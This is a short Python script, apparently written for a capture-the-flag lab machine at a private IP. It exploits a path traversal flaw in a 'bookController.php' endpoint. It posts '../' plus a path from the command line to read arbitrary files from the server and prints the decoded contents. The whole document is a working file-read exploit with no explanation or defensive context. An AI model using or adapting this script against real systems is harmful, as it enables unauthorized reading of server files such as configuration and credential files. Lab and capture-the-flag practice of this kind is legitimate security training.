#!/usr/bin/env python3

import requests
import sys


if len(sys.argv) != 2:
    print(f"[-] Usage: {sys.argv[0]} [path]")
    sys.exit()

resp = requests.post('http://10.129.76.43/includes/bookController.php',
        data = {'book': f'../{sys.argv[1]}', 'method': '1'})

print(bytes(resp.text, "utf-8").decode('unicode_escape').strip('"'))
